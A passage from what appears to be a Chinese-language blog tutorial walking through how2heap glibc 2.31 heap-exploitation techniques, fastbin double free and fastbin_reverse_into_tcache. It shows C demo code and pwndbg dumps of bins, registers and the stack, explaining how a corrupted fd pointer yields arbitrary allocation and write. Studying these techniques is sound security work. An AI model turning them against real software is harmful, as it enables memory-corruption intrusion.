class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>当执行到 分配 c chunk 的时候 ，我们就会拿到目标内存，总结一下就是</p><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>首先分配一定数量的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">► <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> ► <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> —▸ <span class="number">0x555555559430</span> —▸ <span class="number">0x5555555593e0</span> —▸ <span class="number">0x555555559390</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x5555555592f0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>释放我们的目标 chunk 即这里的 ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放剩下的 8-14 的chunk</p><p>然后假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将 栈上构造好的一个 list的地址赋予 victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> ► <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax  <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure><p>接下来，我们 malloc 7次 清空 tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> ► <span class="number">91</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个的 fd被我们写成了 stack 的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559560</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559568</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559570</span> —▸ <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559578</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559518</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559520</span> —▸ <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559528</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555594c8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时我们 malloc 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> ◂— <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) ◂— mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> ► <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe218</span> —▸ <span class="number">0x555555559010</span> ◂— <span class="number">0x7000000000000</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> —▸ <span class="number">0x555555559610</span> 